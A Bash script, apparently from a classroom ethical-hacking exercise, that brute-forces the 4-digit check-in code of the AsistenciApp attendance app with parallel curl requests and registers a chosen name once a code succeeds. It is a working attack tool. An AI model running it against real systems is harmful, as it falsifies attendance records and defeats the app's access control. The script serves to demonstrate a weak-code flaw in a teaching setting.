#!/usr/bin/env bash
# Demo de hack ético: fuerza bruta de códigos de 4 dígitos (plan §2.7).
# Solo usar contra tu propia sesión de práctica (localhost / clase demo).

set -uo pipefail

URL=""
SESION=""
NOMBRE=""
JOBS=50
DESDE=0
HASTA=9999

usage() {
  cat <<'EOF'
hack-etico.sh — demo de fuerza bruta de códigos de 4 dígitos (AsistenciApp).
EOF
  cat <<'EOF'

Uso:
  hack-etico.sh --url BASE --sesion ID --nombre "Nombre"
  hack-etico.sh --enlace 'http://localhost:8000/alumno.html?s=ID' --nombre "Nombre"

Opciones:
  --url URL        Base de la app (sin barra final)
  --sesion ID      Identificador de la clase (parámetro s del enlace de alumnos)
  --enlace URL     Enlace completo de alumno.html; extrae url y sesión
  --nombre TEXTO   Nombre a registrar cuando acierte el código
  --jobs N         Peticiones en paralelo (por defecto: 32)
  --desde N        Primer código a probar (0-9999, por defecto: 0)
  --hasta N        Último código a probar (0-9999, por defecto: 9999)
  -h, --help       Muestra esta ayuda

Ejemplo:
  python app.py   # en otra terminal, desde exercises/asistenciapp
  ./asistencia/hack-etico.sh \\
    --url http://localhost:8000 \\
    --sesion abc123 \\
    --nombre "Demo Hack Ético"
EOF
}

parse_enlace() {
  local enlace="$1"
  SESION=$(printf '%s' "$enlace" | sed -n 's/.*[?&]s=\([^&]*\).*/\1/p')
  if [[ -z "$SESION" ]]; then
    echo "error: falta el parámetro s= en el enlace" >&2
    exit 2
  fi
  URL=$(printf '%s' "$enlace" | sed -n 's|^\(.*\)/[^/?]*[?].*|\1|p')
  if [[ -z "$URL" ]]; then
    echo "error: no se pudo obtener la base del enlace" >&2
    exit 2
  fi
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --url)
      URL="${2:-}"
      shift 2
      ;;
    --sesion)
      SESION="${2:-}"
      shift 2
      ;;
    --enlace)
      parse_enlace "${2:-}"
      shift 2
      ;;
    --nombre)
      NOMBRE="${2:-}"
      shift 2
      ;;
    --jobs)
      JOBS="${2:-}"
      shift 2
      ;;
    --desde)
      DESDE="${2:-}"
      shift 2
      ;;
    --hasta)
      HASTA="${2:-}"
      shift 2
      ;;
    -h | --help)
      usage
      exit 0
      ;;
    *)
      echo "error: opción desconocida: $1" >&2
      usage >&2
      exit 2
      ;;
  esac
done

if [[ -z "$NOMBRE" ]]; then
  echo "error: falta --nombre" >&2
  usage >&2
  exit 2
fi

if [[ -z "$URL" || -z "$SESION" ]]; then
  echo "error: indica --url y --sesion, o --enlace" >&2
  usage >&2
  exit 2
fi

URL="${URL%/}"

if ! [[ "$JOBS" =~ ^[0-9]+$ ]] || (( JOBS < 1 )); then
  echo "error: --jobs debe ser un entero >= 1" >&2
  exit 2
fi

if ! [[ "$DESDE" =~ ^[0-9]+$ ]] || ! [[ "$HASTA" =~ ^[0-9]+$ ]]; then
  echo "error: --desde y --hasta deben ser enteros" >&2
  exit 2
fi

if (( DESDE < 0 || DESDE > 9999 || HASTA < 0 || HASTA > 9999 || DESDE > HASTA )); then
  echo "error: rango inválido (usa 0-9999 y desde <= hasta)" >&2
  exit 2
fi

if ! command -v curl >/dev/null 2>&1; then
  echo "error: hace falta curl" >&2
  exit 2
fi

TOTAL=$(( HASTA - DESDE + 1 ))
WORKDIR=$(mktemp -d)
trap 'rm -rf "$WORKDIR"' EXIT

FOUND_FLAG="$WORKDIR/found"
RESULT_FILE="$WORKDIR/result"
PROGRESS_FILE="$WORKDIR/progress"
: >"$PROGRESS_FILE"

echo "Hack ético · solo sesión propia · $TOTAL códigos · $JOBS en paralelo" >&2
echo "Objetivo: $URL/api/s/$SESION/checkin" >&2

export URL SESION NOMBRE FOUND_FLAG RESULT_FILE PROGRESS_FILE

probar_codigo() {
  local n="$1"
  if [[ -f "$FOUND_FLAG" ]]; then
    return 0
  fi

  local code
  code=$(printf '%04d' "$n")
  local endpoint body tmp http

  endpoint="$URL/api/s/$SESION/checkin"
  # Escapar comillas y backslashes en el nombre para JSON mínimo
  body=$(printf '{"name":"%s","code":"%s"}' \
    "$(printf '%s' "$NOMBRE" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
    "$code")

  tmp=$(mktemp)
  http=$(curl -sS -o "$tmp" -w '%{http_code}' -X POST "$endpoint" \
    -H 'Content-Type: application/json' \
    -d "$body" 2>/dev/null) || {
    rm -f "$tmp"
    return 0
  }

  if [[ -f "$FOUND_FLAG" ]]; then
    rm -f "$tmp"
    return 0
  fi

  case "$http" in
    201)
      touch "$FOUND_FLAG"
      {
        echo "code=$code"
        echo "http=$http"
        cat "$tmp"
      } >"$RESULT_FILE"
      rm -f "$tmp"
      return 0
      ;;
    200)
      if grep -q '"already"[[:space:]]*:[[:space:]]*true' "$tmp" 2>/dev/null; then
        touch "$FOUND_FLAG"
        {
          echo "code=$code"
          echo "http=$http"
          echo "already=true"
          cat "$tmp"
        } >"$RESULT_FILE"
      fi
      rm -f "$tmp"
      return 0
      ;;
    409)
      touch "$FOUND_FLAG"
      {
        echo "fatal=closed"
        cat "$tmp"
      } >"$RESULT_FILE"
      rm -f "$tmp"
      return 0
      ;;
    404)
      touch "$FOUND_FLAG"
      {
        echo "fatal=notfound"
        cat "$tmp"
      } >"$RESULT_FILE"
      rm -f "$tmp"
      return 0
      ;;
    422)
      rm -f "$tmp"
      ;;
    *)
      rm -f "$tmp"
      ;;
  esac

  # Progreso aproximado (puede saltarse en paralelo)
  if [[ -w "$PROGRESS_FILE" ]]; then
    local count
    count=$( ( read -r n <"$PROGRESS_FILE" 2>/dev/null || n=0; echo $((n + 1)) ) )
    echo "$count" >"$PROGRESS_FILE"
    if (( count % 500 == 0 )); then
      echo "  … ~$count / $TOTAL probados" >&2
    fi
  fi
}

export -f probar_codigo
export TOTAL

seq "$DESDE" "$HASTA" | xargs -P "$JOBS" -n 1 bash -c 'probar_codigo "$1"' _

if [[ ! -f "$RESULT_FILE" ]]; then
  echo "No se encontró código válido en este barrido." >&2
  echo "El código pudo haber cambiado (rotación cada 30 s). Vuelve a lanzar el script." >&2
  exit 1
fi

if grep -q '^fatal=closed' "$RESULT_FILE"; then
  echo "La asistencia de esta clase ya está cerrada." >&2
  exit 1
fi

if grep -q '^fatal=notfound' "$RESULT_FILE"; then
  echo "Esta clase no existe. Revisa el enlace o el id de sesión." >&2
  exit 1
fi

CODE=$(grep '^code=' "$RESULT_FILE" | head -1 | cut -d= -f2-)
HTTP=$(grep '^http=' "$RESULT_FILE" | head -1 | cut -d= -f2-)
JSON=$(grep -v '^code=\|^http=\|^already=\|^fatal=' "$RESULT_FILE" | tr -d '\n' | sed 's/^[[:space:]]*//')

if grep -q '^already=true' "$RESULT_FILE"; then
  echo "El nombre «$NOMBRE» ya estaba registrado (código probado: $CODE)."
  echo "$JSON"
  exit 0
fi

echo "Código válido encontrado: $CODE (HTTP $HTTP)"
echo "$JSON"
exit 0
